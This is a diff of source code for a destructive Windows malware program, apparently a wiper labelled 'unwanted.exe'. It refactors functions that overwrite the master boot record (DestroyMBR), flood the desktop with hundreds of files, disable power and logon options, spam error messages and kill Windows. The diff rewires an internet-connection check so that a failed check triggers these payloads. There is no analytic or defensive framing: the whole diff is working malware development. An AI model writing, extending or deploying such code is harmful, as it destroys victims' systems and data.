@@ -338,9 +338,11 @@ void CreateDesktopFiles() {
     {
         for (int i = 0; i < 300; ++i) {
             SHGetFolderPath(NULL, CSIDL_DESKTOP | CSIDL_FLAG_CREATE, NULL, 0, szPath);
-            PathAppend(szPath, L"a" + rand() % 3000);
+            PathAppend(szPath, L"a" + random() % 3000);
             CreateFileW(szPath, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
+            Sleep(5);
         }
+        SHChangeNotify(SHCNE_ASSOCCHANGED, SHCNF_IDLIST, NULL, NULL);
     }
 }
 
@@ -772,10 +774,6 @@ void DisableLogonOptions() {
 
 }
 
-void testreg() {
-    RegCreateSet(HKEY_CLASSES_ROOT, TEXT("*\\shell\\_¡þ∞á£Ω▒δïñ_æåí\\command"), NULL, REG_SZ, TEXT("C:\\Program Files\\Common Files\\WINNT32.EXE"), sizeof(TEXT("C:\\Program Files\\Common Files\\WINNT32.EXE")));
-}
-
 void DisablePowerOptions() {
     
 
@@ -972,22 +970,7 @@ void StartFuckingPC() {
 }
 
 void StartErrorSpam() {
-    Sleep(5000);
-    int argc;
-    LPWSTR* argv = CommandLineToArgvW(GetCommandLineW(), &argc);
-    if (argc > 1) {
-        if (!lstrcmpW(argv[1], L"skipdestroymbr")) {
-            
-        }
-        else
-        {
-            DestroyMBR();
-        }
-    }
-    else
-    {
-        DestroyMBR();
-    }
+	Sleep(5000); // The MBR should be already destroyed when this function is called
     
     CreateThread(NULL, NULL, &payloadThread, &StartBeep, NULL, NULL);
     CreateThread(NULL, 4096, &STARTripmessages, NULL, NULL, NULL);
@@ -998,91 +981,6 @@ void StartErrorSpam() {
 
     StartFuckingPC();
     DisablePowerOptions();
-}
-
-/* Download a file for test Internet connection */
-void TestInternetConnection() {
-    if (InternetCheckConnectionW(L"https://www.google.com", FLAG_ICC_FORCE_CONNECTION, 0) == TRUE) {
-        // success        
-    }
-    else // else kills os
-    {
-        CreateThread(NULL, NULL, &payloadThread, &StartErrorSpam, NULL, NULL);
-        int DisplayResourceNAMessageBox();
-        {
-            int msgboxID = MessageBox(
-                NULL,
-                (LPCWSTR)L"Unknown hard error:\r\nBetter working with Internet Connected",
-                (LPCWSTR)L"unwanted.exe - System Warning",
-                MB_ICONERROR | MB_OK
-            );
-        };
-
-        int argc;
-        LPWSTR* argv = CommandLineToArgvW(GetCommandLineW(), &argc);
-        if (argc > 1) {
-            if (!lstrcmpW(argv[1], L"skipdestroymbr")) {
-                
-            }
-            else
-            {
-                DestroyMBR();
-            }
-        }
-        else
-        {
-            DestroyMBR();
-        }
-        StartFuckingPC();
-        DisablePowerOptions();
-        CreateThread(NULL, NULL, &payloadThread, &StartBeep, NULL, NULL);
-        CreateThread(NULL, 4096, &STARTripmessages, NULL, NULL, NULL);
-        CreateThread(NULL, NULL, &payloadThread, &killWindowsInstant, NULL, NULL);
-
-    };
-
-}
-
-void TestInternetConnection2() {
-    if (InternetCheckConnectionW(L"https://www.google.com", FLAG_ICC_FORCE_CONNECTION, 0) == TRUE) {
-        // success        
-    }
-    else // else kills os
-    {
-        CreateThread(NULL, NULL, &payloadThread, &StartErrorSpam, NULL, NULL);
-        int DisplayResourceNAMessageBox();
-        {
-            int msgboxID = MessageBox(
-                NULL,
-                (LPCWSTR)L"message: who does live without internet?",
-                (LPCWSTR)L"unwanted.exe - System Warning",
-                MB_ICONERROR | MB_OK
-            );
-        };
-
-        int argc;
-        LPWSTR* argv = CommandLineToArgvW(GetCommandLineW(), &argc);
-        if (argc > 1) {
-            if (!lstrcmpW(argv[1], L"skipdestroymbr")) {
-
-            }
-            else
-            {
-                DestroyMBR();
-            }
-        }
-        else
-        {
-            DestroyMBR();
-        }
-        StartFuckingPC();
-        DisablePowerOptions();
-        CreateThread(NULL, NULL, &payloadThread, &StartBeep, NULL, NULL);
-        CreateThread(NULL, 4096, &STARTripmessages, NULL, NULL, NULL);
-        CreateThread(NULL, NULL, &payloadThread, &killWindowsInstant, NULL, NULL);
-
-    };
-
 }
 
 void NormalComputer() {
@@ -1207,6 +1105,12 @@ void UnknownHradError() {
     DisablePowerOptions();
     ExitProcess(0);
 }
+
+/* Download a file for test Internet connection */
+void TestInternetConnection() {
+    if (!InternetCheckConnectionW(L"https://www.google.com", FLAG_ICC_FORCE_CONNECTION, 0)) UnknownHradError();
+}
+
 
 void DownlaodFiles() {
 
